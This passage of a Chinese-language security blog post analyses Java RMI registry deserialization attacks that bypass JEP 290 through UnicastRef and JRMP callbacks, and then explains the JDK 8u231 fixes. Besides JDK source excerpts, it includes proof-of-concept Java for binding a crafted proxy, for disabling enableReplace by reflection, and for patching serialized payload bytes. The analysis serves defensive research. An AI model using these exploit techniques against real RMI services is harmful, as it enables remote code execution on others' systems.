class="line"></span><br></pre></td></tr></table></figure>
+
+<p>然而这里会有一个神奇的问题，我们知道<code>transient</code>修饰的变量在正常的序列化过程中是不会被序列化的（会为空）。那我们特制的ref不就因为无论怎么样都不序列化了？</p>
+<p>但理论的确如此，但实际不是的，因为我们还知道如果这个类对于writeobject、readobject进行了重写，就会进入这个方法进行特殊的逻辑执行。</p>
+<p><code>java.rmi.server.RemoteObject#writeObject</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">private void writeObject(java.io.ObjectOutputStream out)</span><br><span class="line">        throws java.io.IOException, java.lang.ClassNotFoundException</span><br><span class="line">    &#123;</span><br><span class="line">        if (ref == null) &#123;</span><br><span class="line">            throw new java.rmi.MarshalException(&quot;Invalid remote object&quot;);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            String refClassName = ref.getRefClass(out);</span><br><span class="line">            if (refClassName == null || refClassName.length() == 0) &#123;</span><br><span class="line">                //不会进入的地方....</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                /*</span><br><span class="line">                 * Built-in reference class specified, so delegate</span><br><span class="line">                 * to reference to write out its external form.</span><br><span class="line">                 */</span><br><span class="line">                 //我们的序列化操作会进入到这里对于ref进行序列化</span><br><span class="line">                out.writeUTF(refClassName);</span><br><span class="line">                ref.writeExternal(out);</span><br><span class="line">                //在这里通过writeExternal来写入了ref</span><br><span class="line">                //（transient类型的变量可以通过writeExternal来写入序列化）</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>在Remoteobject的writeobject方法中可以完成对于同时，我们也可以通过把序列化结果写入文件看序列化结果来证明ref的序列化不会受到影响。</p>
+<p>那么在确定<strong>RemoteObjectInvocationHandler</strong>可以填入一个<strong>UnicastRef对象</strong>并且不影响序列化之后。接下来就是利用动态代理进行类型转变</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">public class Bypass290 &#123;</span><br><span class="line">    //省略generateUnicastRef方法</span><br><span class="line">    public static void main(String[] args) throws Exception&#123;</span><br><span class="line">        //获取UnicastRef对象</span><br><span class="line">        String jrmpListenerHost = &quot;127.0.0.1&quot;;//本地测试</span><br><span class="line">        int jrmpListenerPort = 1199;</span><br><span class="line">        UnicastRef ref = generateUnicastRef(jrmpListenerHost, jrmpListenerPort);</span><br><span class="line">        //通过构造函数封装进入RemoteObjectInvocationHandler</span><br><span class="line">        RemoteObjectInvocationHandler obj = new RemoteObjectInvocationHandler(ref);</span><br><span class="line">        //使用动态代理改变obj的类型变为Registry，这是Remote类型的子类</span><br><span class="line">        //所以接下来bind可以填入proxy</span><br><span class="line">        Registry proxy = (Registry) Proxy.newProxyInstance(Bypass290.class.getClassLoader(),</span><br><span class="line">                                                           new Class[]&#123;Registry.class&#125;, obj);</span><br><span class="line">        //触发漏洞</span><br><span class="line">        Registry registry = LocateRegistry.getRegistry(1099);//本地测试</span><br><span class="line">        registry.bind(&quot;hello&quot;, proxy);//填入payload</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h5 id="3-找一个带UnicastRef类型参数的实现Remote接口的类"><a href="#3-找一个带UnicastRef类型参数的实现Remote接口的类" class="headerlink" title="3.找一个带UnicastRef类型参数的实现Remote接口的类"></a>3.找一个带UnicastRef类型参数的实现Remote接口的类</h5><p>那么第三种情况，直接不用动态代理构造去弄成Remote接口，直接找一个实现Remote接口的类。</p>
+<ol>
+<li>这个类它可以填入一个UnicastRef对象（这表示我们的payload可以塞进去）</li>
+<li>这个类要是Remote接口的</li>
+</ol>
+<h6 id="RemoteObjectInvocationHandler"><a href="#RemoteObjectInvocationHandler" class="headerlink" title="RemoteObjectInvocationHandler"></a>RemoteObjectInvocationHandler</h6><p>其实<strong>RemoteObjectInvocationHandler</strong>本身就是一个实现了Remote接口的类。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">//RemoteObjectInvocationHandler定义，继承自RemoteObject</span><br><span class="line">public class RemoteObjectInvocationHandler</span><br><span class="line">    extends RemoteObject</span><br><span class="line">    implements InvocationHandler</span><br><span class="line"></span><br><span class="line">//RemoteObject定义，实现了Remote接口</span><br><span class="line">public abstract class RemoteObject implements Remote, java.io.Serializable &#123;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>可以发现我们的RemoteObjectInvocationHandler继承自RemoteObject。</p>
+<ol>
+<li>而UnicastRef对象是在RemoteObject类中赋值的</li>
+<li>RemoteObject类又是一个Remote接口</li>
+</ol>
+<p>那么理论上来说所有RemoteObject的子类都是可以的</p>
+<p>我们选取<strong>RMIConnectionImpl_Stub</strong>和<strong>UnicastRemoteObject</strong>来举例说明</p>
+<h6 id="RMIConnectionImpl-Stub"><a href="#RMIConnectionImpl-Stub" class="headerlink" title="RMIConnectionImpl_Stub"></a>RMIConnectionImpl_Stub</h6><p>RMIConnectionImpl_Stub是可以利用的。</p>
+<p>是Remote接口：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">//RMIConnectionImpl_Stub类定义，继承自RemoteStub类</span><br><span class="line">public final class RMIConnectionImpl_Stub</span><br><span class="line">    extends java.rmi.server.RemoteStub</span><br><span class="line">    implements javax.management.remote.rmi.RMIConnection&#123;</span><br><span class="line"></span><br><span class="line">//java.rmi.server.RemoteStub 定义，继承自RemoteObject类</span><br><span class="line">abstract public class RemoteStub extends RemoteObject &#123;</span><br><span class="line"></span><br><span class="line">//RemoteObject定义，实现Remote接口</span><br><span class="line">public abstract class RemoteObject implements Remote, java.io.Serializable &#123;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>利用构造方法可以容纳一个UnicastRef对象：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">//javax.management.remote.rmi.RMIConnectionImpl_Stub#RMIConnectionImpl_Stub 构造方法</span><br><span class="line">public RMIConnectionImpl_Stub(java.rmi.server.RemoteRef ref) &#123;</span><br><span class="line">    super(ref);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">//java.rmi.server.RemoteStub#RemoteStub(java.rmi.server.RemoteRef) 构造方法</span><br><span class="line"> protected RemoteStub(RemoteRef ref) &#123;</span><br><span class="line">        super(ref);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">//java.rmi.server.RemoteObject#RemoteObject(java.rmi.server.RemoteRef) 构造方法</span><br><span class="line">protected RemoteObject(RemoteRef newref) &#123;</span><br><span class="line">        ref = newref;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>攻击代码就很简单，跟RemoteObjectInvocationHandler完全一致改个参数就完事了</p>
+<h6 id="UnicastRemoteObject"><a href="#UnicastRemoteObject" class="headerlink" title="UnicastRemoteObject"></a>UnicastRemoteObject</h6><p>UnicastRemoteObject实际上满足我们说的所有条件，但是是不可以利用的。</p>
+<p>它的确是Remote接口：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">//java.rmi.server.UnicastRemoteObject定义</span><br><span class="line">public class UnicastRemoteObject extends RemoteServer &#123;</span><br><span class="line"></span><br><span class="line">//java.rmi.server.RemoteServer定义</span><br><span class="line">public abstract class RemoteServer extends RemoteObject//这个就是了 不赘述</span><br><span class="line">&#123;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>同样由于继承自RemoteObject，所以同样有一个RemoteObject类中的ref参数，但是在UnicastRemoteObject类中，没有使用到。</p>
+<p>我们实际上也是可以操控这个变量的，之前是通过构造函数直接赋值，现在可以通过反射机制来赋值，实现如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">//3.UnicastRemoteObject</span><br><span class="line"> //3.1.获取到UnicastRemoteObject的实例</span><br><span class="line"> Class clazz = Class.forName(&quot;java.rmi.server.UnicastRemoteObject&quot;);</span><br><span class="line"> Constructor m = clazz.getDeclaredConstructor();</span><br><span class="line"> m.setAccessible(true);</span><br><span class="line"> UnicastRemoteObject UnicastRemoteObject_obj =(UnicastRemoteObject)m.newInstance();</span><br><span class="line"> //3.2.修改实例的ref参数（使用yso中的模块）</span><br><span class="line"> Reflections.setFieldValue(UnicastRemoteObject_obj,&quot;ref&quot;,ref);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>但是在实际利用的时候，<strong>使用UnicastRemoteObject是不可以的！</strong></p>
+<p>其实关键点在于：</p>
+<ul>
+<li>我们默认理解为序列化过程是对于我们的恶意object进行writeobject，<code>RMIConnectionImpl_Stub.writeobject()</code>、<code>UnicastRemoteObject.writeobject()</code>那么当然是序列化的。（实际上也可以，在github的Bypass290代码中尝试序列化写入了文件中进行查看，结果也是把正确的ref值写入了，就不贴图了）</li>
+<li>但是实际上客户端序列化的过程为：ObjectOutput.writeobject(我们的恶意object)</li>
+</ul>
+<p>那么实际上这边的序列化逻辑与我们想象的有点出入，<strong>他会去替换掉我们辛辛苦苦生成的object</strong>。这是导致同是继承RemoteObject有的行，有的不行的关键。</p>
+<p>我们在<code>java.io.ObjectOutputStream#writeObject0</code>打入断点，使用UnicastRemoteObject对象来攻击，细看：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">private void writeObject0(Object obj, boolean unshared)</span><br><span class="line">        throws IOException</span><br><span class="line">    &#123;</span><br><span class="line">        boolean oldMode = bout.setBlockDataMode(false);</span><br><span class="line">        depth++;</span><br><span class="line">        try &#123;</span><br><span class="line">            //一大堆类型检查，都不会通过</span><br><span class="line"></span><br><span class="line">            // 想要去检查替换我们的object</span><br><span class="line">            Object orig = obj;</span><br><span class="line">            Class&lt;?&gt; cl = obj.getClass();</span><br><span class="line">            ObjectStreamClass desc;</span><br><span class="line">            for (;;) &#123;</span><br><span class="line">                //查找相关内容</span><br><span class="line">            &#125;</span><br><span class="line">            if (enableReplace) &#123;//都是true</span><br><span class="line">            //!!!!!!!!!!!此处替换了我们的对象！！！！！！！！！！</span><br><span class="line">                Object rep = replaceObject(obj);</span><br><span class="line">                if (rep != obj &amp;&amp; rep != null) &#123;</span><br><span class="line">                    cl = rep.getClass();</span><br><span class="line">                    desc = ObjectStreamClass.lookup(cl, true);</span><br><span class="line">                &#125;</span><br><span class="line">                obj = rep;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            //一些替换后的处理，不太重要</span><br><span class="line"></span><br><span class="line">            // 通过类进行分配序列化过程</span><br><span class="line">            if (obj instanceof String) &#123;</span><br><span class="line">                writeString((String) obj, unshared);</span><br><span class="line">            &#125; else if (cl.isArray()) &#123;</span><br><span class="line">                writeArray(obj, desc, unshared);</span><br><span class="line">            &#125; else if (obj instanceof Enum) &#123;</span><br><span class="line">                writeEnum((Enum&lt;?&gt;) obj, desc, unshared);</span><br><span class="line">            &#125; else if (obj instanceof Serializable) &#123;</span><br><span class="line">                //进入此处再开始正常的序列化</span><br><span class="line">                writeOrdinaryObject(obj, desc, unshared);</span><br><span class="line">            //...省略...</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>replaceobject替换的方法具体在<code>sun.rmi.server.MarshalOutputStream#replaceObject</code>中</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">//var1就是我们想要序列化的类</span><br><span class="line">protected final Object replaceObject(Object var1) throws IOException &#123;</span><br><span class="line">    //这个类要是Remote接口的，并且不是RemoteStub接口的，为true</span><br><span class="line">    if (var1 instanceof Remote &amp;&amp; !(var1 instanceof RemoteStub)) &#123;</span><br><span class="line">        //这里会去获取到新的对象来替换</span><br><span class="line">        //UnicastRemoteObject走的就是这条路</span><br><span class="line">        Target var2 = ObjectTable.getTarget((Remote)var1);</span><br><span class="line">        if (var2 != null) &#123;</span><br><span class="line">            return var2.getStub();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    //RMIConnectionImpl_Stub走的就是这条路</span><br><span class="line">    return var1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>那么就很明显了，之前我们觉得只要是remote接口就行了，这个定义有问题，实际上要满足以下两个条件的类我们才能用：</p>
+<ol>
+<li>是Remote接口</li>
+<li>并且是RemoteStub接口</li>
+</ol>
+<p>所以RMIConnectionImple_Stub可以，但是UnicastRemoteObject不行的原因。</p>
+<h6 id="新的小问题-RemoteObjectInvocationHandler为啥又可以了"><a href="#新的小问题-RemoteObjectInvocationHandler为啥又可以了" class="headerlink" title="新的小问题-RemoteObjectInvocationHandler为啥又可以了"></a>新的小问题-RemoteObjectInvocationHandler为啥又可以了</h6><p>但是我们又会发现一开始就成功的RemoteObjectInvocationHandler并不满足我们的出来的规定，它是Remote接口但是不是RemoteStub接口呀。<br><img src="/images/20230430151950.png"><br>发现虽然它不满足条件进入了if，但是获取到的替换类var2为空，又返回原本的值了。</p>
+<p>至于为什么会获取到的结果var2为空，是因为在getTarget中会去内部查询，查不到，就会返回空</p>
+<pre><code>public static Target getTarget(Remote impl) &#123;
+    synchronized (tableLock) &#123;
+        return implTable.get(new WeakRef(impl));
+    &#125;
+&#125;
+</code></pre>
+<p>在分析中我们发现<strong>ObjectOutputStream对象流</strong>中的<strong>enableReplace</strong>全局变量决定了我们的对象是否会被替换：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">public class ObjectOutputStream</span><br><span class="line">    extends OutputStream implements ObjectOutput, ObjectStreamConstants</span><br><span class="line">&#123;</span><br><span class="line">    /** if true, invoke replaceObject() */</span><br><span class="line">    private boolean enableReplace;</span><br><span class="line"></span><br><span class="line">    private void writeObject0(Object obj, boolean unshared)</span><br><span class="line">        throws IOException</span><br><span class="line">    &#123;</span><br><span class="line">        ...</span><br><span class="line">        if (enableReplace) &#123;//都是true</span><br><span class="line">            ...</span><br><span class="line">        &#125;</span><br><span class="line">        ...</span><br><span class="line">     &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>那么其实我们只要用反射机制，在序列化前把out对象的<strong>enableReplace属性修改为false</strong>就可以了(这需要重新实现bind查询，来进行修改)。大概如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">java.io.ObjectOutput out = call.getOutputStream();</span><br><span class="line">//反射修改enableReplace</span><br><span class="line">ReflectionHelper.setFieldValue(out, &quot;enableReplace&quot;, false);</span><br><span class="line">out.writeObject(obj); // 写入我们的对象</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h5 id="4-带UnicastRef类型参数的实现Remote接口的类—自定义"><a href="#4-带UnicastRef类型参数的实现Remote接口的类—自定义" class="headerlink" title="4.带UnicastRef类型参数的实现Remote接口的类—自定义"></a>4.带UnicastRef类型参数的实现Remote接口的类—自定义</h5><p>但是如果我们回忆之前的出的结论：</p>
+<blockquote>
+<p>反序列化打服务端，可以使用一个服务端不存在的类。在这个服务端不存在的类的变量中放入payload，这个payload会在服务端反序列化这个不存在的类的时候触发，虽然会报错，但是会触发。</p>
+</blockquote>
+<p>我们实际上之前做的所有的研究都是无用功，因为我们压根不用去找一个存在于JDK中的类去满足条件来进行攻击，而是自己写一个就可以了。</p>
+<p>实现一个可以序列化的remote接口的类，然后正常攻击</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">public static class lala_remote implements Remote, java.io.Serializable &#123;</span><br><span class="line">        private RemoteRef ref;</span><br><span class="line"></span><br><span class="line">        public lala_remote(UnicastRef remoteref) throws Throwable &#123;</span><br><span class="line">            ref=remoteref;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>可以注意到不是RemoteStub接口，自实现的类会满足上卖弄整理的第三种情况，不会被替换对象。</p>
+</blockquote>
+<h4 id="bind的局限性"><a href="#bind的局限性" class="headerlink" title="bind的局限性"></a>bind的局限性</h4><p>好的，重新整理心情。来讨论随便的bind的局限性。</p>
+<p>当我们在本地进行试验的时候，使用高于8u141的版本也是可以命令执行的。这会形成一种不受版本限制的错觉。</p>
+<p>但实际上在远程攻击的时候，这种攻击是有局限性的。</p>
+<blockquote>
+<p>bind操作中注册端对于服务端的地址验证。</p>
+</blockquote>
+<h3 id="与RMI客户端反序列化攻击RMI服务端-Lookup结合"><a href="#与RMI客户端反序列化攻击RMI服务端-Lookup结合" class="headerlink" title="与RMI客户端反序列化攻击RMI服务端-Lookup结合"></a>与RMI客户端反序列化攻击RMI服务端-Lookup结合</h3><p>使用拦截器来替换攻击包的字节码，来自己重构一个攻击包的字节码。这个思路非常底层和繁琐，但是理论上可以绕过所有客户端限制逻辑。</p>
+<h4 id="基于Barmie拦截器的自实现"><a href="#基于Barmie拦截器的自实现" class="headerlink" title="基于Barmie拦截器的自实现"></a>基于Barmie拦截器的自实现</h4><p>在Barmie的原逻辑中，拦截器中字节码的拼接非常简单粗暴，他会保留一些包头固定格式，然后修改参数。通常都是直接复制成功的poc的16进制字节码，然后修改其中命令执行的16进制代码，再拼接进入数据包进行发送。比如CC的payload是这样：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">private final String _header_chunk = &quot;737200116a6176612e757469....&quot;;//开头的序列化信息</span><br><span class="line">private final String _footer_chunk = &quot;740004657865637571007e00....&quot;;//结尾的序列化信息</span><br><span class="line"></span><br><span class="line">//开头塞进去</span><br><span class="line">out.write(this.fixReferences(this.hexStrToByteArray(this._header_chunk), refCorrection));</span><br><span class="line"></span><br><span class="line">//自定义添加要执行的String形式的命令</span><br><span class="line">out.write(this.stringToUtf8ByteArray(cmd));</span><br><span class="line"></span><br><span class="line">//结尾塞进去</span><br><span class="line">out.write(this.fixReferences(this.hexStrToByteArray(this._footer_chunk), refCorrection));</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>我们的Remote接口的对象原本也可以按照这个思路，找一个成功的数据包，然后修改其中的JRMP服务器回连IP和端口就行了。</p>
+<p>但是对比JRMP服务器地址：888.888.888.888:8887、888.888.888.888:8888两次攻击数据包发现：</p>
+<p>JRMP服务器回连IP可以简单进行修改，但是端口却是不可以显性直接进行修改的。</p>
+<p>直接序列化不能正常利用攻击，与攻击成功数据包对比发现需要修正000078-&gt;00007078。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">//使用RMIConnectionImpl_Stub类</span><br><span class="line">RMIConnectionImpl_Stub RMIConnectionImpl_Stub_obj = new RMIConnectionImpl_Stub(ref);</span><br><span class="line">//序列化，同时修正000078-&gt;00007078</span><br><span class="line">byte[] serial_Primary=serialize(RMIConnectionImpl_Stub_obj);</span><br><span class="line">//除去aced开头（序列化开头）</span><br><span class="line">byte[] serial_byte= new byte[serial_Primary.length-4];</span><br><span class="line">System.arraycopy(serial_Primary, 4, serial_byte, 0, serial_byte.length);</span><br><span class="line">//填入传输流</span><br><span class="line">out.write(this.fixReferences(serial_byte));</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h4 id="重实现lookup逻辑"><a href="#重实现lookup逻辑" class="headerlink" title="重实现lookup逻辑"></a>重实现lookup逻辑</h4><p>参考<a target="_blank" rel="noopener" href="https://github.com/wh1t3p1g/ysomap">ysomap</a></p>
+<p>实现的方法：做了上层lookup函数的重写，这样子就实现起来就很简单简洁，且不用考虑底层字节的各种情况。</p>
+<p><code>ysomap.core.exploit.rmi.component.Naming#lookup</code>直接把原来的接口<code>lookup(String)</code>调成<code>lookup(Object)</code>（实现不是如此，逻辑是如此，数据包封装的逻辑实际上直接照搬过来就可以了）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">//多加了个registry参数，然后自己实现部分固定值的获取</span><br><span class="line">public static Remote lookup(Registry registry, Object obj)</span><br><span class="line">            throws Exception &#123;</span><br><span class="line">        RemoteRef ref = (RemoteRef) ReflectionHelper.getFieldValue(registry, &quot;ref&quot;);</span><br><span class="line">        long interfaceHash = (long) ReflectionHelper.getFieldValue(registry, &quot;interfaceHash&quot;);</span><br><span class="line">        java.rmi.server.Operation[] operations = (Operation[]) ReflectionHelper.getFieldValue(registry, &quot;operations&quot;);</span><br><span class="line">        try &#123;</span><br><span class="line">        ....//之后就跟原来的lookup一样了</span><br><span class="line">            //同时这里我还加入了绕过enableReplace，使UnicastRemoteObject可用</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h3 id="8u231的修复"><a href="#8u231的修复" class="headerlink" title="8u231的修复"></a>8u231的修复</h3><p>对比JDK做了两处修复：</p>
+<ol>
+<li><code>sun.rmi.registry.RegistryImpl_Skel#dispatch</code>报错情况消除ref</li>
+<li><code>sun.rmi.transport.DGCImpl_Stub#dirty</code>提前了黑名单</li>
+</ol>
+<h4 id="第一处修复"><a href="#第一处修复" class="headerlink" title="第一处修复"></a>第一处修复</h4><blockquote>
+<p>在openjdk中可以在线查看对比<a target="_blank" rel="noopener" href="https://hg.openjdk.java.net/jdk8u/jdk8u/jdk/file/69c4f673b33e/src/share/classes/sun/rmi/registry/RegistryImpl_Skel.java">8u232u8的RegistryImpl_Skel.java</a>与<a target="_blank" rel="noopener" href="https://hg.openjdk.java.net/jdk8u/jdk8u/jdk/file/5456f24496f4/src/share/classes/sun/rmi/registry/RegistryImpl_Skel.java">8u232u9的RegistryImpl_Skel.java</a></p>
+</blockquote>
+<p>其实只有一行的区别，在每个动作比如lookup，bind等中都添加了一个逻辑：**如果出现了序列化报错都会进入catch，执行<code>discardPedingRefs</code>**。</p>
+<p>在<code>sun.rmi.transport.StreamRemoteCall#discardPendingRefs</code>中其实也就是做了一件事情，把我们之前装载的<code>incomingRefTable</code>清空</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">public void discardPendingRefs() &#123;</span><br><span class="line">    this.in.discardRefs();//去下面</span><br><span class="line">&#125;</span><br><span class="line">//sun.rmi.transport.ConnectionInputStream#discardRefs</span><br><span class="line">void discardRefs() &#123;</span><br><span class="line">    this.incomingRefTable.clear();//消除incomingRefTable里面我们的ref</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>那么很清楚假如我们的payload在序列化中发生了报错，那么我们想尽办法装载的ref就会被干掉。再回头看看我们的那么多种payload都会报错么？</p>
+<ol>
+<li><p><strong>自定义类（动态代理或接口）</strong>：报错ClassNotFoundException</p>
+<p>因为我们传入的类虽然会完成装载，但是在后续的序列化逻辑中肯定是会因为找不到我们的恶意类而发生ClassNotFoundException报错的。</p>
+<p>被干掉了。</p>
+</li>
+<li><p><strong>动态代理转换接口或者找内置接口</strong>：报错ClassCastException</p>
+<p>而其他的payload虽然因为都是有内置类的，这些内置类在序列化的时候<code>var9.readObject();</code>是没问题的。</p>
+<p>但是这里还有一个类型转换的逻辑<code>var8 = (String)var9.readObject();</code>在类型转换的时候就会发生报错。</p>
+<p>从而也被干掉了。</p>
+</li>
+</ol>
+<h4 id="第二处修复"><a href="#第二处修复" class="headerlink" title="第二处修复"></a>第二处修复</h4><p>实际上第一处修复已经完美修复了，但是还有第二处修复针对的是ref被触发的时候，即<code>var7.releaseInputStream();</code></p>
+<p>回顾<code>UnicastRef对象</code>这一小节，重新看我们POC触发的调用栈图的左下角，它必定会经过<code>sun.rmi.transport.DGCImpl_Stub#dirty</code></p>
+<blockquote>
+<p>在openjdk中可以在线查看对比<a target="_blank" rel="noopener" href="https://hg.openjdk.java.net/jdk8u/jdk8u/jdk/file/69c4f673b33e/src/share/classes/sun/rmi/transport/DGCImpl_Stub.java">8u232u8的DGCImpl_Stub.java</a>与<a target="_blank" rel="noopener" href="https://hg.openjdk.java.net/jdk8u/jdk8u/jdk/file/5456f24496f4/src/share/classes/sun/rmi/transport/DGCImpl_Stub.java">8u232u9的DGCImpl_Stub.java</a></p>
+</blockquote>
+<p><a target="_blank" rel="noopener" href="https://xzfile.aliyuncs.com/media/upload/picture/20200622152129-fd728322-b458-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200622152129-fd728322-b458-1.png"></a></p>
+<p>在dirty方法中三个关键语句：</p>
+<ol>
+<li><code>this.ref.newCall</code>：发起JRMP请求</li>
+<li><code>var6.setObjectInputFilter(DGCImpl_Stub::leaseFilter);</code>：过滤</li>
+<li><code>this.ref.invoke()</code>：触发JRMP返回payload反序列化解析</li>
+</ol>
+<p>把过滤器放在解析之前，那么JRMP请求是可以发起的，但是你最后命令执行的payload（比如CC）会被过滤器给干掉。</p>
